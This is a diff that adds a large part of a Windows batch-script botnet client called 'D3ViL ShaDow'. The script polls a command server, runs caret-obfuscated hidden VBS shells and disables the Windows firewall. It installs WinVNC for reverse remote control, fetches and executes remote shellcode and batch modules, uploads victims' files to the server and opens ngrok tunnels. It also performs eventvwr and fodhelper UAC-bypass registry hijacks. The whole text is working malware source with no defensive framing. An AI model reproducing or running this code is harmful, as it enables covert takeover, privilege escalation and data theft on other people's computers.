+echo S^e^t^ W^s^h^S^h^e^l^l = C^r^e^a^t^e^O^b^j^e^c^t("WScript.Shell")>>exec.vbs
+echo R^e^t^u^r^n^C^o^d^e = W^s^h^S^h^e^l^l.r^u^n ("cmd.exe /c %command% ",0, True)>>exec.vbs
+if exist exec.vbs start exec.vbs & goto check_backdoor
+echo [-] Can't Start Shell > output
+goto upload_output
+:check_backdoor
+ping localhost -n 3 >nul
+For /F "tokens=3,4" %%A in ('netstat -ano ^| find /i "%command3%:%command4%"') do (
+if "%%B"=="ESTABLISHED" goto done
+)
+echo [-] Can't Get Shell > output
+goto upload_output
+:done
+echo [+] Got Shell > output
+goto upload_output
+rem ******Winvnc ********************************************
+:winvnc_command
+if "%command3%"=="kill" goto winvnc_kill
+if "%command3%"=="install" goto winvnc_install
+echo [*] Checking Winvnc Serivce
+set vnc_service=
+for /F "tokens=2" %%A in ('netstat -ano ^| find /i "0.0.0.0:5959"') do (
+set vnc_service=%%A
+)
+if "%vnc_service%"=="0.0.0.0:5959" ( echo [+] Winvnc Serivce Already Runing & goto connect ) else ( echo [-] Winvnc Serivce Not Started & goto run_vnc )
+:connect
+start /min %botnetdir%\winvnc.exe -connect %command3%::%command4%
+ping localhost -n 5 >nul
+echo [*] Checking Connecting Status
+for /f "tokens=5" %%a in ('netstat -ano ^| find /i "established"') do (
+for %%A in (winvnc) do (
+for /f %%b in ('tasklist ^| find "%%a"') do (
+for /f "delims=" %%j in ('echo %%b ^| find /i "%%A.exe"') do set check=%%j
+)
+)
+)
+if defined check (
+set check=
+echo [+] Winvnc Connected > output
+goto upload_output
+) else (
+echo [-] Winvnc Not Connect > output
+goto upload_output
+)
+:run_vnc
+echo [+] Checking Winvnc Files
+if exist "winvnc.exe" (
+echo [+] Winvnc.exe ....Found
+) else (
+echo [-] Winvnc.exe Not Found > output
+goto upload_output
+)
+if exist "ultravnc.ini" (
+echo [+] ultravnc.ini ....Found
+) else (
+echo [-] ultravnc.ini Not Found > output
+goto upload_output
+)
+if exist "vnchooks.dll" (
+echo [+] vnchooks.dll ....Found
+) else (
+echo [-] vnchooks.dll Not Found > output
+goto upload_output
+)
+echo [+] Starting Winvnc Serivce
+netsh firewall set opmode mode=DISABLE >nul
+netsh firewall add portopening TCP 5859 "Winvnc" >nul
+netsh firewall add portopening TCP 5958 "Winvnc" >nul
+start winvnc.exe
+ping localhost -n 5 >nul
+echo [*] Checking Winvnc Serivce
+set vnc_service=
+for /F "tokens=2" %%A in ('netstat -ano ^| find /i "0.0.0.0:5959"') do (
+set vnc_service=%%A
+)
+if "%vnc_service%"=="0.0.0.0:5959" ( echo [+] Winvnc Serivce Started successfully & goto connect ) else ( echo [-] Winvnc Serivce Not Start > output & goto upload_output )
+:winvnc_install
+set winvnc_url=https://raw.githubusercontent.com/DevilBot000/Tools/master/Winvnc.rar
+set rar_url=https://raw.githubusercontent.com/DevilBot000/Tools/master/rar.exe
+if not exist rar.exe echo [*] rar.exe Downloading & curl "%rar_url%" --output rar.exe >nul
+if not exist rar.exe echo [-] Can't Download Rar.exe > output & goto upload_output
+if not exist winvnc.rar echo [*] winvnc.rar Downloading & curl "%winvnc_url%" --output winvnc.rar >nul
+if not exist winvnc.rar echo [-] Can't Download Winvnc.rar > output & goto upload_output
+rar e -y winvnc.rar >nul
+echo [+] Checking Winvnc Files
+if exist "winvnc.exe" (
+echo [+] Winvnc.exe ....Found
+) else (
+echo [-] Winvnc.exe Not Found > output
+goto upload_output
+)
+if exist "ultravnc.ini" (
+echo [+] ultravnc.ini ....Found
+) else (
+echo [-] ultravnc.ini Not Found > output
+goto upload_output
+)
+if exist "vnchooks.dll" (
+echo [+] vnchooks.dll ....Found
+echo [+] Winvnc Installed Successfully > output
+goto upload_output
+) else (
+echo [-] vnchooks.dll Not Found > output
+goto upload_output
+)
+:winvnc_kill
+echo [*] checking winvnc is running
+for /f "tokens=1" %%A in ('tasklist ^| find /i "winvnc.exe"') do (
+if "%%A"=="winvnc.exe" taskkill /im winvnc.exe /f >nul & echo [+] Winvnc Kill Successfully >output & goto upload_output
+) 
+echo [-] Winvnc Already Stop > output
+goto upload_output
+:download_command
+set /A count=0
+echo [*] Sending "%uploadfile%" to %hosturl%
+echo [*] Checking "%uploadflie%" 
+if not exist rar.exe echo [-] Rar.exe Not Found First Install Rar.exe on target Machine > output & goto upload_output
+if exist "%uploadfile%" (
+if exist file.rar del file.rar
+rar a -y file.rar "%uploadfile%" >nul
+if exist file.rar (
+set send_filename=file.rar
+set go_lable=:upload_output
+goto send_file2
+) else (
+echo [-] %uploadfile% Not Found >output
+goto upload_output
+))
+echo [-] %uploadfile% Not Found >output
+goto upload_output
+:wget_download
+set /A count=0
+echo [*] downloading "%command3%" 
+curl -o nul -sfI "%command3%
+if errorlevel 1 echo [-] %command3% doesn't exist > output & goto upload_output
+echo [+] Downloading %command3% 
+curl %command3% --output "%command4%" --silent
+if exist "%command4%" (
+echo [+] %command4% Downloaded Successfully > output
+goto upload_output
+) else (
+echo [-] %command4% Downloading Failed > output
+goto upload_output
+)
+:upload_command
+echo [*] Checking Files is Exist on Server %hosturl%
+curl -o nul -sfI %hosturl%/devil_shadow/upload/file.rar
+if errorlevel 1 echo [-] File Doesn't exist on Server > output & goto upload_output
+if exist "%temp%\file.rar" del "%temp%\file.rar" >nul
+curl %hosturl%/devil_shadow/upload/file.rar --output "%temp%\file.rar" --silent
+if exist "%temp%\file.rar" (
+rar e -y "%temp%\file.rar" >nul
+echo [+] File Uploaded to %client_id% Successfully > output
+goto upload_output
+) else (
+echo [-] File Uploading Failed to %client_id% > output
+goto upload_output
+)
+
+:check_shellcode_method
+if "%command3%"=="scexe" goto scexe_shellcode
+if "%command3%"=="ruby" goto ruby_shellcode
+goto loop
+
+
+:scexe_shellcode
+echo [*] Downloading Shellcode 
+if exist exec.vbs del exec.vbs
+curl -o nul -sfI %hosturl%/devil_shadow/upload/exec.vbs
+if errorlevel 1 echo [-] Shellcode Doesn't Exit On Server > output & goto upload_output
+curl %hosturl%/devil_shadow/upload/exec.vbs --output exec.vbs --silent
+echo [+] Files Downloaded Successfully
+curl %hosturl%/devil_shadow/upload/del_shellcode.php >nul
+if exist scexec-win32.exe (
+start exec.vbs 
+echo [+] Shellcode Execute Successfully on Target Machine > output & goto upload_output
+) else (
+echo [-] scexec-win32.exe Not Found > output & goto upload_output
+)
+
+:ruby_shellcode
+echo [*] Downloading Shellcode 
+if exist shellcode.txt del shellcode.txt
+curl -o nul -sfI %hosturl%/devil_shadow/upload/shellcode.rb
+if errorlevel 1 echo [-] Shellcode Doesn't Exit On Server > output & goto upload_output
+curl %hosturl%/devil_shadow/upload/shellcode.rb --output shellcode.txt --silent
+echo [+] Files Downloaded Successfully
+curl %hosturl%/devil_shadow/upload/del_shellcode.php >nul
+if exist shellcode.txt goto check_ruby
+echo [-] Shellcode Not Download > output
+goto upload_output
+
+:check_ruby
+if exist "Programs\Ruby\bin\ruby.exe" (
+if exist exec.vbs del exec.vbs
+echo S^e^t W^s^h^S^h^e^l^l = Crea^teObject^("WScript.Shell"^)>>exec.vbs
+echo Retu^rnCode = Ws^hSh^e^l^l.run ^("cmd.exe /c Programs\Ruby\bin\ruby.exe shellcode.txt",0, True^)>>exec.vbs
+) else (
+echo [-] Ruby is not Installed > output
+goto upload_output
+)
+
+if exist exec.vbs (
+echo [*] Starting Shellcode
+start exec.vbs
+echo [+] Shellcode Started Successfully > output
+goto upload_output
+) else (
+echo [-] Shellcode Execution failed > output
+goto upload_output
+)
+
+
+:script_executer
+if exist bscript.txt del bscript.txt >nul
+curl -o nul -sfI %hosturl%/devil_shadow/upload/bscript.txt
+if errorlevel 1 echo [-] Bat Script Doesn't Exit On Server > output & goto upload_output
+curl %hosturl%/devil_shadow/upload/bscript.txt --output bscript.txt --silent >nul
+if exist bscript.txt (
+SchTasks /Create /SC DAILY /TN "script_exec" /TR "cmd /c more C:\botnet\bscript.txt | cmd" /ST 23:36 /F >nul
+schtasks /run /TN "script_exec" >nul
+schtasks /Delete /TN "script_exec" /F >nul
+echo [+] Command Execute Successfully > output
+goto upload_output
+
+
+:load_modules
+if exist external.bat del external.bat >nul
+curl -o nul -sfI %hosturl%/devil_shadow/upload/external.txt
+if errorlevel 1 echo [-] Bat Script Doesn't Exit On Server > output & goto upload_output
+curl %hosturl%/devil_shadow/upload/external.txt --output external.bat --silent >nul
+if exist external.bat (
+call external.bat
+if exist external.bat del external.bat >nul
+goto upload_output
+) else (
+echo [-] external.bat Download Failed > output
+goto upload_output
+)
+
+:ngroks_command
+if "%command3%"=="install" goto ngrok_install
+if "%command3%"=="update" goto ngrok_update
+if "%command3%"=="authtoken" goto ngrok_authtoken
+if "%command3%"=="tcp" goto ngrok_protocol
+if "%command3%"=="http" goto ngrok_protocol
+if "%command3%"=="kill" goto ngrok_kill
+:ngrok_install
+echo [*] Downloading Ngrok Zip File Form Original Website
+set ngrok_url=https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-386.zip
+if exist ngrok.exe echo [+] ngrok Already Installed > output & goto upload_output
+curl "%ngrok_url%" --output ngrok.zip >nul
+if exist ngrok.zip (
+unzip.exe -ox ngrok.zip >nul
+) else (
+echo [-] Can't Download Ngrok From Site > output
+goto upload_output
+)
+if exist ngrok.exe (
+echo [+] Ngrok Installed Successfully > output
+goto upload_output
+) else (
+echo [-] Installtion Failed > output
+goto upload_output
+)
+:ngrok_update
+echo [*] Updating Ngrok
+if exist ngrok.exe (
+if exist exec.vbs del exec.vbs
+echo S^e^t Ws^hSh^ell = Cre^at^eObj^ect("WScript.Shell"^)>>exec.vbs
+echo Retu^rnC^ode = W^shS^hell.ru^n ("cmd.exe /c ngrok.exe update",0, True^)>>exec.vbs
+start exec.vbs
+if errorlevel 1 echo [-] Ngrok Updating Failed > output & goto upload_output
+echo [+] Ngrok Update in background > output
+goto upload_output
+) else (
+echo [-] Ngrok.exe Not Found > output
+goto upload_output
+)
+:ngrok_authtoken
+if not exist ngrok.exe echo [-] Ngrok.exe Not Found > output & goto upload_output
+echo [+] Config ngrok
+if not defined command4 echo [-] No Authtoken Keys Found > output & goto upload_output
+ngrok authtoken %command4%
+if exist "%userprofile%/.ngrok2/ngrok.yml" (
+echo [+] Authtoken saved to configuration "%userprofile%/.ngrok2/ngrok.yml" > output
+goto upload_output
+) else (
+echo [-] Authtoken Failed > output
+goto upload_output
+)
+:ngrok_protocol
+echo [*] Checking Ngrok File
+if not exist ngrok.exe echo [-] Ngrok.exe Not Found > output & goto upload_output
+set ngrok_host=
+for /f "tokens=1" %%A in ('curl -s -N http://127.0.0.1:4040/api/tunnels ^| grep -o "0.tcp.ngrok.io:[0-9*]"') do set ngrok_host=%%A
+if defined ngrok_host echo [+] Ngrok Already Running (%ngrok_host%^) > output & goto upload_output
+)
+for /f "tokens=1" %%A in ('curl -s -N http://127.0.0.1:4040/api/tunnels ^| grep -o "http://[a-z0-9]*.ngrok.io"') do set ngrok_host=%%A
+if defined ngrok_host echo [+] Ngrok Already Running (%ngrok_host%^) > output & goto upload_output
+)
+echo [*] exec.vbs to execute ngrok
+if exist exec.vbs del exec.vbs
+echo Se^t Ws^hShe^ll = Cr^eat^eO^bje^ct("WScript.Shell")>>exec.vbs
+echo Re^tur^nCo^de = Ws^h^Sh^el^l.ru^n ("cmd.exe /c ngrok.exe %command3% %command4%",0, True)>>exec.vbs
+if exist exec.vbs start exec.vbs
+ping localhost -n 3 >nul
+echo [*] Checking Ngrok is Running
+set find_ngrok_host=
+if "%command3%"=="tcp" set find_ngrok_host=0.tcp.ngrok.io:[0-9]*
+if "%command3%"=="http" set find_ngrok_host=http://[a-z0-9]*.ngrok.io
+for /f "tokens=1" %%A in ('curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "%command3%"') do (
+if defined find_ngrok_host goto ngrok_done
+)
+echo [-] Ngrok Can't Running > output
+goto upload_output
+:ngrok_done
+echo [+] Ngrok Successfully Running to %find_ngrok_host% > output
+goto upload_output
+:ngrok_kill
+echo [*] Checking Ngrok Serivce
+set ngrok_process=
+for /f "tokens=2" %%A in ('netstat -ano ^| find /i "127.0.0.1:4040"') do (
+set ngrok_process=%%A
+)
+if "%ngrok_process%"=="127.0.0.1:4040" (
+echo [+] Killing Ngrok to taskmgr 
+taskkill /im ngrok.exe /f >nul
+echo [+] Ngrok Kill Successfully > output
+goto upload_output
+) else (
+echo [-] Ngrok Already Stop > output
+goto upload_output
+)
+
+:update_check
+if "%command3%"=="client" goto update_client
+if "%command3%"=="python" goto update_python
+if "%command3%"=="ruby" goto update_ruby
+if "%command3%"=="autoit" goto update_autoit
+
+
+:update_client
+echo [*] Updating Client 
+curl %hosturl%/devil_shadow/agent/client.txt --output update.cmd --silent
+if exist update.cmd (
+copy /y update.cmd %filename% >nul
+del update.cmd >nul
+echo [+] Client Successfully Updated > output
+goto upload_output
+) else (
+echo [-] Updating Failed > output
+goto upload_output
+)
+
+
+:update_python
+taskkill /im python.exe /f >nul
+echo [*] Downloading Python27 Zip
+set python_url=https://raw.githubusercontent.com/DevilBot000/Tools/master/Python27.zip
+if exist python27.zip del python27.zip >nul
+curl "%python_url%" --output python27.zip >nul
+if exist python27.zip (
+echo [*] python27.zip Downloaded
+) else (
+echo [-] python27.zip Downloading Failed > output
+goto upload_output
+)
+if exist unzip.exe (
+unzip.exe -o -x python27.zip -d "Programs" >nul
+) else (
+echo [-] unzip.exe Not Found > output
+goto upload_output
+)
+echo [+] Python27 Update Successfully > output
+goto upload_output
+
+
+
+:update_ruby
+taskkill /im ruby.exe /f >nul
+echo [*] Downloading Ruby Zip
+set ruby_url=https://raw.githubusercontent.com/DevilBot000/Tools/master/Ruby.zip
+if exist Ruby.zip del Ruby.zip >nul
+curl "%ruby_url%" --output ruby.zip >nul
+if exist Ruby.zip (
+echo [*] Ruby.zip Downloaded
+) else (
+echo [-] Ruby.zip Downloading Failed > output
+goto upload_output
+)
+if exist unzip.exe (
+unzip.exe -o -x Ruby.zip -d "Programs" >nul
+) else (
+echo [-] unzip.exe Not Found > output
+goto upload_output
+)
+echo [+] Ruby Update Successfully > output
+goto upload_output
+
+
+:update_autoit
+taskkill /im AutoIt3.exe /f >nul
+taskkill /im keylog_autoit.exe /f >nul
+echo [*] Downloading Autoit Zip
+set autoit_url=https://raw.githubusercontent.com/DevilBot000/Tools/master/autoit.rar
+if exist autoit.rar del autoit.rar >nul
+curl "%autoit_url%" --output autoit.rar >nul
+if exist autoit.rar (
+echo [*] autoit.rar Downloaded
+) else (
+echo [-] autoit.rar Downloading Failed > output
+goto upload_output
+)
+if exist rar.exe (
+rar e -y autoit.rar "Programs\Autoit" >nul
+) else (
+echo [-] rar.exe Not Found > output
+goto upload_output
+)
+echo [+] AutoIt Update Successfully > output
+goto upload_output
+
+
+:found_uac_vul
+rem UAC Exploit Script
+set win7=Windows 7
+set win8=Windows 8
+set win81=Windows 8.1
+set win10=Windows 10
+rem Get Systeminfo
+For /F "Tokens=4,5" %%A in ('systeminfo ^| find /i "os name:"') do (
+set osver=%%A %%B
+)
+rem System Base
+For /F "Tokens=3" %%A in ('systeminfo ^| find /i "System Type"') do (
+set osbase=%%A
+)
+:setuac_cmd
+set textfile=
+set textfile=test_%random%.txt
+if "%command2%"=="get_uac_vul" (
+set uac_command=echo test ^>%systemdrive%\%textfile%
+goto check_win_ver
+)
+if "%command2%"=="uacbypass" (
+if exist "%temp%\uac.bat" del "%temp%\uac.bat" >nul
+if exist "%temp%\uac.tmp" del "%temp%\uac.tmp" >nul
+set uac_command=call "%temp%\uac.bat"
+echo echo off >>"%temp%\uac.bat"
+echo p^o^w^ers^he^ll -win h^id^de^n exit >>"%temp%\uac.bat"
+echo echo test ^>"%temp%\uac.tmp" >>"%temp%\uac.bat"
+echo ping localhost -n 30 ^>nul >>"%temp%\uac.bat"
+echo Taskkill /FI "WINDOWTITLE eq D3ViL ShaDow" >>"%temp%\uac.bat"
+echo start %systemdrive%\botnet\botnet_start.vbs >>"%temp%\uac.bat"
+)
+:check_win_ver
+if "%osver%"=="%win7%" goto reg_make_exploit
+if "%osver%"=="%win8%" goto reg_make_exploit
+if "%osver%"=="%win81%" goto reg_make_exploit
+if "%osver%"=="%win10%" goto win_10_reg_exploit
+echo [-] %osver% Invalid OS Version > output
+goto upload_output
+
+
+:reg_make_exploit
+echo [+] Creating Malicious Registry Entry
+if exist reg_exploit.txt del reg_exploit.txt >nul
+echo reg add Hk^ey_CUR^RENT_USER\Sof^tw^are\Cl^as^s^es\ms^cfi^l^e\she^l^l\op^en\co^mm^a^nd /t reg_sz /d "cmd /c %uac_command%" /f >>reg_exploit.txt
+echo e^v^en^tv^wr.exe >>reg_exploit.txt
+ping localhost -n 2 >nul
+echo [+] Starting e^v^en^tv^wr.exe
+SchTasks /Create /SC DAILY /TN "NoUAC" /TR "cmd /c more C:\botnet\reg_exploit.txt | cmd" /ST 23:36 /F >nul
+schtasks /run /TN "NoUAC" >nul
+schtasks /Delete /TN "NoUAC" /F >nul
+echo [+] Removing Malicious Registry
+reg Delete H^ke^y_CU^RR^EN^T_USER\So^ft^wa^re\C^l^a^sse^s\ms^c^fi^l^e\s^h^el^l\o^pe^n\c^om^ma^nd /f >nul
+echo [+] Done
+ping localhost -n 5 >nul
+goto check_uac_exploit
+
+:win_10_reg_exploit
+echo [+] Creating Malicious Registry Entry
+if exist reg_exploit.txt del reg_exploit.txt >nul
+echo reg add H^k^ey_CU^RRENT_US^E^R\Sof^tw^ar^e\Cl^a^ss^es\m^s-se^t^ti^ng^s\S^he^l^l\O^pe^n\co^m^m^an^d /t reg_sz /d "cmd /c %uac_command%" /f >>reg_exploit.txt
+echo reg add H^k^ey_CUR^RE^NT_US^ER\S^o^ft^wa^r^e\C^la^ss^es^\m^s-s^e^t^t^ing^s\S^h^el^l\O^p^e^n\co^m^ma^nd /v D^e^leg^at^eE^xec^u^t^e /t reg_sz /f >>reg_exploit.txt
+echo %systemdrive%\Windows\System32\fodhelper.exe >>reg_exploit.txt
+echo [+] Starting fodhelper.exe
+ping localhost -n 2 >nul
+SchTasks /Create /SC DAILY /TN "NoUAC" /TR "cmd /c more C:\botnet\reg_exploit.txt | cmd" /ST 23:36 /F >nul
+schtasks /run /TN "NoUAC" >nul
+schtasks /Delete /TN "NoUAC" /F >nul
+echo [+] Removing Malicious Registry
+reg Delete Hk^e^y_C^URR^E^N^T_U^SE^R\S^o^f^twa^r^e\C^la^s^se^s\ms-se^tt^in^gs\sh^e^ll\o^pe^n\co^m^ma^n^d /f >nul
+echo [+] Done
+ping localhost -n 5 >nul
+goto check_uac_exploit
+
+:check_uac_exploit
+if "%command2%"=="get_uac_vul" (
+if exist "%systemdrive%\%textfile%" (
+echo [+] %osver% is Vulnerable > output
+goto upload_output
+) else (
+echo [-] %osver% Not Vulnerable > output
+goto upload_output
+))
+
+if "%command2%"=="uacbypass" (
+if exist "%temp%\uac.tmp" (
+echo [+] UAC Exploit Done Wait for 30 Sec. > output
+goto upload_output
+) else (
+echo [-] UAC Exploit Failed > output
+goto upload_output
+))
+
+
+rem ***** send multi files ***********************************
+:send_file
+if "%count%"=="3" goto sleep
+echo [*] Sending %send_filename% to %hosturl%
+curl -H "Content-Type:multipart/form-data" -F "file=@%send_filename%" -X POST %hosturl%/devil_shadow/upload/index.php >nul
+if errorlevel 1 echo [-] uploading failed & echo [*] Again try %count% time & set /A count+=1& goto send_file
+echo [+] Uploaded Successfully
+goto loop
+:send_file2
+if "%count%"=="3" echo [-] Can't Upload %uploadfile% > output & goto upload_output
+echo [*] Sending %send_filename% to %hosturl%
+curl -H "Content-Type:multipart/form-data" -F "file=@%send_filename%" -X POST %hosturl%/devil_shadow/upload/index.php >nul
+if errorlevel 1 echo [-] uploading failed & echo [*] Again try %count% time & set /A count+=1& goto send_file2
+echo [+] Uploaded Successfully
+echo download_success> output
+goto %go_lable%
+rem **************************************************************
+
